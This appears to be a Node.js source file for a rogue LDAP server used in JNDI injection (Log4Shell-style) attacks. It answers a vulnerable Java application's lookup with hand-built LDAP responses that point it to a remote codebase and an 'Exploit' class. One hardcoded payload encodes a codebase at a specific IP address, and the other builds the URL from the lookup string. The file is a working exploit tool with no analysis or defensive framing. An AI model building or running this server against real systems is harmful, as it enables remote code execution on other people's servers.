/** Lightweight ldap jndi payload thing
// ${jndi:ldap://localhost:389/http://example.com} -> jndi lookup redirects to class file from http://example.com/Exploit.class
**/

var send_payloads = [
    "300c02010161070a010004000400",
    "30819202010264818c040261733081853016040d6a617661436c6173734e616d6531050403666f6f302b040c6a617661436f646542617365311b0419687474703a2f2f3137382e36322e3232342e3135313a38302f3024040b6f626a656374436c617373311504136a6176614e616d696e675265666572656e63653018040b6a617661466163746f7279310904074578706c6f6974",
    "300c02010265070a010004000400"
];
let hex_length = function(num){
    let hex = (num).toString(16);
    return hex.length < 2 ? `0${hex}` : hex;
}
var create_payload = function(receive_url){
    if(receive_url[receive_url.length-1] != "/") {
        receive_url+="/";
    }
    let endpoint = receive_url;
    let first_chunk = "3016040d6a617661436c6173734e616d6531050403666f6f30" + hex_length((endpoint.length)+18) + "040c6a617661436f64654261736531" + hex_length((endpoint.length)+2) + "04" + hex_length(endpoint.length) + Buffer.from(endpoint, 'utf8').toString("hex") + "3024040b6f626a656374436c617373311504136a6176614e616d696e675265666572656e63653018040b6a617661466163746f7279310904074578706c6f6974";
    let second_chunk = "040261733081" + hex_length(first_chunk.length/2) + first_chunk;
    let third_chunk = "0201026481" + hex_length(second_chunk.length/2) + second_chunk;
    let payload = "3081" + hex_length(third_chunk.length/2) + third_chunk;
    console.log(payload);
    return Buffer.from(payload, 'hex');
}

console.log(send_payloads);
require('net').createServer(function (socket) {
    socket.on("error", (err) => {
        console.log(err);
    });
    console.log((new Date().toLocaleString()) + " - Connection received from: " + socket.remoteAddress );
    let i = 0;
    socket.on('data', function (data) {
        let rec = (Buffer.from(data, 'utf8').toString("hex"));
        console.log("received:" + rec);
        if(i == 1){
            let datareceived = rec.slice(18, rec.indexOf("0a01000a01"));
            let receive_url = (Buffer.from(datareceived, 'hex').toString("utf8"));
            console.log(receive_url);
            
            if(receive_url.indexOf("http") == 0){
                // a lookup like ${jndi:ldap://localhost:1337/http://example.com} -> redirects to class file from example.com/Exploit.class
                socket.write(create_payload(receive_url));
            } else {
                socket.write(Buffer.from(send_payloads[1], 'hex'));
            }
            socket.write(Buffer.from(send_payloads[2], 'hex'));
            console.log("sent payload")

        } else if(i==0){
            socket.write(Buffer.from(send_payloads[0], 'hex'));
        }
        i++;
    });
})
.listen(389);